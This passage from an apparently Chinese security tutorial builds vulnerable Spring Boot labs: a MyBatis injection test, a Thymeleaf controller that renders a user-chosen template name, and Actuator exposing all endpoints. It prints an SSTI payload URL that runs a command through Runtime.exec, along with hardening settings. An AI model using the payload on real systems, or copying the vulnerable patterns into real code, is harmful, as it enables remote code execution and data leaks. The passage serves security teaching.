class="hljs-keyword">return</span> password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-built_in">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-comment">// 重写 toString() 以便于日志记录和调试</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;id=&quot;</span> + id +<br>                <span class="hljs-string">&quot;, username=&#x27;&quot;</span> + username + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, password=&#x27;&quot;</span> + password + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p> 创建Mapper动态接口代理类实现</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.springbootmybatils.mapper;<br><br><span class="hljs-keyword">import</span> com.example.springbootmybatils.entity.User;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Insert;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Mapper;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Select;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@Mapper</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;<br><br>    <span class="hljs-comment">// 根据提供的id选择所有用户的SQL查询</span><br>    <span class="hljs-meta">@Select(&quot;select * from admin &quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">findAll</span><span class="hljs-params">(Integer id)</span>;<br><br>    <span class="hljs-comment">// 根据特定id选择所有用户的SQL查询</span><br>    <span class="hljs-meta">@Select(&quot;select * from admin where id=1&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">findID</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p> 创建Controller实现Web访问调用</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.springbootmybatils.controller;<br><br><span class="hljs-keyword">import</span> com.example.springbootmybatils.entity.User;<br><span class="hljs-keyword">import</span> com.example.springbootmybatils.mapper.UserMapper;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetadminController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> UserMapper UserMapper;<br><br>    <span class="hljs-comment">// 根据用户id检索管理员数据的端点</span><br>   <span class="hljs-meta">@GetMapping(&quot;/getadmin&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">getadmindata</span><span class="hljs-params">()</span>&#123;<br>        List&lt;User&gt; all = UserMapper.findAll();<br>        <span class="hljs-keyword">return</span> all;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/getid&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">getadminid</span><span class="hljs-params">()</span>&#123;<br>        List&lt;User&gt; all = UserMapper.findID();<br>        <span class="hljs-keyword">return</span> all;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p> 文件目录如下</p>
<p> <img src="/assets/image-20240717201100-ftj3nic.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240717201433-pc8tskj.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <strong>测试注入</strong></p>
<p> <img src="/assets/image-20240717201601-szf1fxs.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240717201612-hczpzfz.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 代码存在漏洞</p>
<p> <img src="/assets/image-20240717201846-l6qq6k2.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240717201853-1xyzzh2.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240717201639-im931x4.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>Thymeleaf模版注入漏洞</p>
<p> <img src="/assets/image-20240717201939-nqos9s6.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 1、新建项目</p>
<p> <img src="/assets/image-20240717202027-3007tdc.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240717202037-haia2ol.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 2、使用模板渲染，必须在resources目录下创建templates存放html文件</p>
<p> <img src="/assets/image-20240717202304-wm3fiah.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> index.html</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;data&#125;&quot;</span>&gt;</span>小迪安全<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p> test.html</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>xiaodi<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>xiaodisec<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p> 3、创建Controller实现Web访问调用</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.xiaodisec.thyremeafdemo.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThyremeafController</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(Model model)</span> &#123;<br>        model.addAttribute(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;hello xiaodi&quot;</span>);<br>        <span class="hljs-comment">//@RestController 自带ResponseBody index当做字符串显示操作</span><br>        <span class="hljs-comment">//Controller 没有ResponseBody index当做资源文件去渲染</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/test&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//@RestController ResponseBody index当做字符串显示操作</span><br>        <span class="hljs-comment">//Controller 没有ResponseBody index当做资源文件去渲染</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;<br>    &#125;<br><br><span class="hljs-comment">//    @RequestMapping(value = &quot;/&quot;)</span><br><span class="hljs-comment">//    public String index(@RequestParam String lang) &#123;</span><br><span class="hljs-comment">//        //@RestController ResponseBody index当做字符串显示操作</span><br><span class="hljs-comment">//        //Controller 没有ResponseBody index当做资源文件去渲染</span><br><span class="hljs-comment">//        return lang; //lang=en index-en</span><br><span class="hljs-comment">//    &#125;</span><br><br><br>&#125;<br></code></pre></td></tr></table></figure>
<p> <strong>安全问题：</strong></p>
<p> 日常开发中：语言切换页面，主题更换等传参导致的SSTI注入安全问题</p>
<p> 例如：更换中英文页面模板</p>
<p> ​<img src="/assets/image-20240717202710-9ac9bi5.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> ​<img src="https://img-blog.csdnimg.cn/img_convert/ecb6fc545b7ec5c193ba401fa20cd89f.png" srcset="/img/loading.gif" lazyload alt="Untitled">​</p>
<p> 4、创建如下的控制器实现Web访问调用，和渲染模板文件<br> ThyremeafController .java</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-comment">//@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThyremeafController</span> &#123;<br><br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-comment">//@RestController ResponseBody index当做字符串显示操作</span><br>        <span class="hljs-comment">//Controller 没有ResponseBody index当做资源文件去渲染</span><br>        <span class="hljs-keyword">return</span> lang; <span class="hljs-comment">//lang=en index-en</span><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
<p> index-en.html</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p> 5、启动项目，并输入对应路由访问，指向渲染文件的文件名<code>?lang=index-en http://127.0.0.1:8080/?lang=index-en</code>​</p>
<p> ​<img src="/assets/image-20240717203059-ankqbud.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 6、替换为注入<code>http://127.0.0.1:8080/?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x</code>​发现报错</p>
<p> ​<img src="/assets/image-20240717203250-otucqfy.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 原因：Thymeleaf版本问题</p>
<p> 7、替换pom.xml整个文件，到对应的漏洞版本再次注入</p>
<p> 存在漏洞的版本的pom.xml</p>
<p> ​<img src="/assets/image-20240717203517-5z5gda4.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>java-spring-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--latest--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2.0.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p> ​<img src="/assets/image-20240717204230-nmvprj7.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 正常的pom.xml（这里只是用版本作为一个比较，代码其他内容肯定也不一样）</p>
<p> ​<img src="/assets/image-20240717203604-yyntmdj.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="JavaEE应用-SpringBoot框架-Actuator监控泄漏-Swagger自动化"><a href="#JavaEE应用-SpringBoot框架-Actuator监控泄漏-Swagger自动化" class="headerlink" title="JavaEE应用&amp;SpringBoot框架&amp;Actuator监控泄漏&amp;Swagger自动化"></a>JavaEE应用&amp;SpringBoot框架&amp;Actuator监控泄漏&amp;Swagger自动化</h3><ol>
<li><p>SpringBoot-监控系统-Actuator</p>
<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/drnrrwfs/article/details/125242990">Spring Boot Actuator 漏洞复现合集_springboot actuator 漏洞-CSDN博客</a></p>
<p> 1、<strong>创建项目</strong></p>
<p> <img src="/assets/image-20240718004127-5zim7dw.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240718004139-p14fa2q.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 2、<strong>配置监控</strong></p>
<ul>
<li><p>application.properties</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># 设置Spring Boot应用的端口为8001</span><br><span class="hljs-attr">server.port</span>=<span class="hljs-string">8001</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># 指定数据库连接的URL，使用MySQL数据库，连接本地主机（localhost）的3306端口上的名为dome01的数据库</span><br><span class="hljs-attr">spring.datasource.url</span>=<span class="hljs-string">jdbc:mysql://localhost:3306/dome01</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># 设置数据库的用户名为root</span><br><span class="hljs-attr">spring.datasource.name</span>=<span class="hljs-string">root</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># 设置数据库的密码为root</span><br><span class="hljs-attr">spring.datasource.password</span>=<span class="hljs-string">root</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># 指定MySQL数据库的JDBC驱动程序的类名</span><br><span class="hljs-attr">spring.datasource.driver-class-name</span>=<span class="hljs-string">com.mysql.jdbc.Driver</span><br><br><span class="hljs-attr">**#</span> <span class="hljs-string">启用所有的Actuator端点，允许通过HTTP访问监控和管理端点</span><br><span class="hljs-attr">management.endpoints.web.exposure.include</span>=<span class="hljs-string">*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># 在健康检查端点中显示详细信息，包括应用程序的各个健康指标</span><br><span class="hljs-attr">management.endpoint.health.show-details</span>=<span class="hljs-string">always**</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>application.yml</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">management</span>:<span class="hljs-string"></span><br>  <span class="hljs-attr">endpoints</span>:<span class="hljs-string"></span><br>    <span class="hljs-attr">web</span>:<span class="hljs-string"></span><br><span class="hljs-comment">      # 允许通过HTTP访问所有的Actuator端点</span><br>      <span class="hljs-attr">exposure</span>:<span class="hljs-string"></span><br>        <span class="hljs-attr">include</span>: <span class="hljs-string">&#x27;*&#x27;</span><br></code></pre></td></tr></table></figure></li>
</ul>
<p> <img src="/assets/image-20240718005404-2k9kliy.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 根据Actuator断点图能暴露出很多敏感信息</p>
<p> <strong>安全配置</strong>：在 application.properties 进行如下配置，关闭某些端点的启用，防止敏感信息泄露</p>
<p> 从这里也可以看出来，&#x2F;actuator&#x2F;env 和 &#x2F;actuator&#x2F;heapdump 这两个目录下爆出来信息是很敏感</p>
<ul>
<li><p>application.properties</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># 启用或禁用Env端点，false表示禁用</span><br><span class="hljs-attr">management.endpoint.env.enabled</span>=<span class="hljs-string">false</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># 启用或禁用Heap Dump端点，false表示禁用</span><br><span class="hljs-attr">management.endpoint.heapdump.enabled</span>=<span class="hljs-string">false</span><br></code></pre></td></tr></table></figure></li>
<li><p>application.yml</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">management</span>:<span class="hljs-string"></span><br>  <span class="hljs-attr">endpoint</span>:<span class="hljs-string"></span><br><span class="hljs-comment">    # 启用或禁用Heap Dump端点，false表示禁用</span><br>    <span class="hljs-attr">heapdump</span>:<span class="hljs-string"></span><br>      <span class="hljs-attr">enabled</span>: <span class="hljs-string">false # 启用接口关闭</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    # 启用或禁用Env端点，false表示禁用</span><br>    <span class="hljs-attr">env</span>:<span class="hljs-string"></span><br>      <span class="hljs-attr">enabled</span>: <span class="hljs-string">false # 启用接口关闭</span><br></code></pre></td></tr></table></figure></li>
</ul>
<p> 3、图像化Server&amp;Client端界面</p>
<p> 服务端-Server搭建</p>
<p> <img src="/assets/image-20240718011126-e5xsa9w.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240718011403-zryieki.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 客户端-client搭建</p>
<p> <img src="/assets/image-20240718011441-5wth8pi.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<ul>
<li><p>application.properties</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># åºç¨æå¡ WEB è®¿é®ç«¯å£</span><br><span class="hljs-comment">#访问端口</span><br><span class="hljs-attr">server.port</span>=<span class="hljs-string">8889</span><br><br><span class="hljs-attr">spring.boot.admin.client.url</span>=<span class="hljs-string">http://127.0.0.1:8888</span><br><span class="hljs-comment">#启用所有的Actuator端点，允许通过HTTP访问监控和管理端点</span><br><span class="hljs-attr">management.endpoints.web.exposure.include</span>=<span class="hljs-string">*</span><br><span class="hljs-comment">#在健康检查端点中显示详细信息，包括应用程序的各个健康指标</span><br><span class="hljs-attr">management.endpoint.health.show-details</span>=<span class="hljs-string">always</span><br></code></pre></td></tr></table></figure></li>
</ul>
<p> 分别启动两个项目文件</p>
<p> <img src="/assets/image-20240718012134-3u9cxa4.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
